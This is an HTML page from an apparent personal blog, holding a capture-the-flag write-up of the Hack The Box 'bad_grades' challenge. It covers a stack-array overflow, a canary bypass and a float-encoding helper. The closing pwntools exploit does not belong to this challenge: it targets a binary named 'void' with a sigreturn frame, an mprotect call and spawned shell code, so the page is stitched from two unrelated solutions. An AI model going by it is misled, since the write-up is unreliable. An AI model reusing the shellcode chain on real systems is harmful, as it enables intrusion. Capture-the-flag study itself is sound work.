@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="/w3css/3/w3.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.6.3/css/font-awesome.min.css">
+<style>
+  
+ul {
+  list-style-type: none;
+  margin: 0;
+  padding: 0;
+  overflow: hidden;
+  background-color: #cecece;
+}
+
+img{
+	border-radius: 8px;
+	display: block;
+  	margin-left: auto;
+  	margin-right: auto;
+	width: 100%;
+	max-width: 300px;
+}
+.writeup{
+  width: 100%;
+  max-width: 750px;
+  padding: 10px;
+  border: 5px solid gray;
+  border-style: dotted solid;
+  margin-left: auto;
+  margin-right: auto;
+	
+}
+ul.ingredients {
+  list-style-type: circle;
+}
+	
+li {
+  float: left;
+}
+
+li.ingredients{
+	text-align: left;
+	}
+li a, .dropbtn   {
+  display: inline-block;
+  color: white;
+  text-align: center;
+  padding: 14px 16px;
+  text-decoration: none;
+}
+
+li a:hover, .dropdown:hover .dropbtn {
+  background-color: grey;
+}
+
+li.dropdown {
+  display: inline-block;
+}
+
+.dropdown-content {
+  display: none;
+  position: absolute;
+  background-color: silver;
+  min-width: 160px;
+  box-shadow: 0px 8px 16px 0px rgba(0,0,0,0.2);
+  z-index: 1;
+}
+
+.dropdown-content a {
+  color: black;
+  padding: 12px 16px;
+  text-decoration: none;
+  display: block;
+  text-align: left;
+}
+
+.dropdown-content a:hover {background-color: #f1f1f1;}
+
+.dropdown:hover .dropdown-content {
+  display: block;
+}
+
+h1{
+   text-align:center;
+   -webkit-text-decoration-line: overline underline; /* Safari */
+   text-decoration-line: overline underline;
+}
+h2{
+   text-decoration-line: underline;
+}
+
+	
+</style>
+</head>
+<body>
+ 
+ <ul>
+  <li><a class="active" href="../index.html">Home</a></li>
+  <li class="dropdown">
+  	<a href="javascript:void(0)" class="droptn">Menu</a>
+  	<div class="dropdown-content">
+		<a href="../docs/CTF-writeup.html">CTF Writeups</a>
+		<a href="#binaryexploitation">Binary Exploitation</a>
+		<a href="#poemsandstories">Poems and Short Stories</a>
+		<a href="../docs/food.html">Food</a>
+	</div>
+  </li>
+  <li><a href="#contact">Contact</a></li>
+  <li><a href="../docs/about.html">About</a></li>
+  
+ </ul>
+<p>     </p>
+<p>     </p>
+<img src="../../images/Hackthebox.png" width="350" height="263" alt="void">
+<p>     </p>
+<div class="writeup">
+	<h1> bad_grades </h1>
+		<p>This is one of the hack the box challenges that I was solving the other day, and have noticed that such concepts appear quite frequently in many ctf's. I would like to take you through the entire challenge and hopefully you will be able to understand the underlying concept!</p>
+
+<p>First off, as usual we do a preliminary check on the binary given to us!
+</p>
+
+	<h2> Preliminary Analysis: </h2>
+   <blockquote>
+	<code>
+```<br>
+Canary                        : ✓ <br>
+NX                            : ✓ <br>
+PIE                           : ✘ <br>
+Fortify                       : ✘ <br>
+RelRO                         : Full<br>
+gef➤  <br>
+```<br>
+	   </code>
+	</blockquote>
+
+
+<p> 
+Alright! So we see PIE disabled but Canary being enabled, which means, we will have to find a way to somehow bypass the canary or obtain a canary leak.</p>
+
+  <p>Let's dive right into the binary by first running it to see what it is all about.</p>
+<blockquote><code>
+  ```<br>
+Your grades this semester were really good BAD!<br>
+<br>
+1. View current grades.<br>
+2. Add new.<br>
+> <br>
+```<br>
+  </code></blockquote>
+  <p>Okay so as we run the challenge with the command `./bad_grades`, we see that we are provided with two options, to view current grades and then to add new! </p>
+
+<p>  Since we don't know anything about the challenge yet, let us go ahead and give choice 1.</p>
+
+  <p>We see something like this:</p>
+  <blockquote><code>
+    ```<br>
+Your grades this semester were really good BAD!<br>
+<br>
+1. View current grades.<br>
+2. Add new.<br>
+> 1<br>
+<br>
+Your grades were:<br> 
+2<br>
+4<br>
+1<br>
+3<br>
+0<br>
+<br>
+You need to try HARDER!<br>
+```<br>
+    </code></blockquote>
+  
+  <p>Alright, so it just exits! Nevermind, let's checkout out option 2! We get:</p>
+  <quoteblock><code>
+    ```<br>
+Your grades this semester were really good BAD!<br>
+<br>
+1. View current grades.<br>
+2. Add new.<br>
+> 2<br>
+Number of grades: 3<br>
+Grade [1]: 4<br>
+Grade [2]: 5<br>
+Grade [3]: 6<br>
+Your new average is: 5.00<br>
+```<br>
+    </code></blockquote>
+  
+<p>
+OK! So here we are allowed to add new grades and at the end it prints our new avaerage. Now let's check out the decompilation for more specifics as to what the binary is doing! For decompilation I normally use IDA. However you are free to use any other software like Ghidra or Hopper V.
+  </p>
+  
+<blockquote><code>
+```<br>
+unsigned __int64 __fastcall sub_400FD5()<br>
+{<br>
+int num; // [rsp+0h] [rbp-120h] BYREF<br>
+int i; // [rsp+4h] [rbp-11Ch]<br>
+double sum; // [rsp+8h] [rbp-118h]<br>
+double array[33]; // [rsp+10h] [rbp-110h] BYREF<br>
+unsigned __int64 v5; // [rsp+118h] [rbp-8h]<br>
+<br>
+v5 = __readfsqword(0x28u);<br>
+sum = 0.0;<br>
+sub_400ACB("Number of grades: ", "cyan", "bold");<br>
+__isoc99_scanf("%d", &num);<br>
+for ( i = 0; i < num; ++i )<br>
+{<br>
+printf("Grade [%d]: ", (unsigned int)(i + 1));<br>
+__isoc99_scanf("%lf", &array[i]);<br>
+sum = array[i] + sum;<br>
+}<br>
+printf("Your new average is: %.2f\n", sum / (double)num);<br>
+return __readfsqword(0x28u) ^ v5;<br>
+}<br>
+```<br>
+
+  <p>The above is the decompilation of function at <code>0x400fd5</code> i.e <code>add_new()</code>. Since it is a stripped file, we may not be able to see seperate user defined functions as such.</p>
+
+  <p>Okay, so what do we understand here? </p>
+
+<p>We see that at first we have an array variable declared locally with size 33. It then asks for how many grades we wish to enter. Since there is no check on the size, we can easily overflow the array variable to gain an rip control. With size=34, we see that it spits `*** stack smashing detected ***: terminated`. So we know, 33 is the size of array, and 34 is where the canary is located. </p>
+
+<p>Furthermore, we see a for loop wherein it asks us to give marks scored and we must observe that we can give any float value as input. However, one must also think as to how can canary and adress values be written in float! For that we can define a function in our exploit that specifically converts the integer to float something like this:</p>
+
+  <blockquote><code>
+    ```<br>
+def double_pointer(pointer_value):<br>
+<br>
+byte_string = p64(pointer_value)<br>
+hex_byte_string = binascii.hexlify(byte_string)<br>
+x = struct.unpack('d', hex_byte_string.decode('hex'))<br>
+return x[0]<br>
+<br>
+```<br>
+    </code></blockquote>
+  <p>To bypass the canary check, since our input is a float value, we can give <code>.</code> as the input for filling up the canary. The <code>%.2f</code> in scanf will ignore the <code>.</code> character and instead store the resulting float value in xmm registers. </p>
+
+<p>Now our process is simple:<br>
+- Bypass canary<br>
+- Get a libc leak<br>
+  - Apply dynamic rop ( or ret2libc) or call one_gadget<br></p>
+
+<h2> Exploit </h2>
+<blockquote><code>
+```<br>
+from pwn import *<br>
+context.arch = 'amd64'<br>
+context.log_level = "debug"<br>
+
+#p = remote("tamuctf.com", 443, ssl=True, sni="void")<br>
+p = process('./void')<br>
+#gdb.attach(p, gdbscript='set disassembly-flavor intel\nb*main\nc\n')<br>
+
+main = 0x0000000000401000<br>
+ret = 0x40101a<br>
+syscall = 0x0000000000401018<br>
+start = 0x400020<br>
+
+frame = SigreturnFrame()<br>
+frame.rax = 10<br>
+frame.rdi = 0x00000000400000<br>
+frame.rsi = 0x1000<br>
+frame.rdx = 0x7<br>
+frame.rsp = 0x00000000400018# ptr to start<br>
+frame.rip = syscall# mprotect syscall<br>
+
+chain = p64(main)<br>
+
+print(str(frame))<br>
+pay = p64(main) + p64(syscall) + bytes(frame)<br>
+p.send(pay)<br>
+sleep(0.1)<br>
+
+p.send(p64(syscall).ljust(15, b'\x00'))<br>
+sleep(0.1)<br>
+p.send(p64(start) + asm('add rsp, 100') + asm(shellcraft.sh()))<br>
+sleep(0.1)<br>
+
+p.interactive()<br>
+```<br>
+	</code></blockquote>
+
+			
+</div>			
+</body>
+</html>
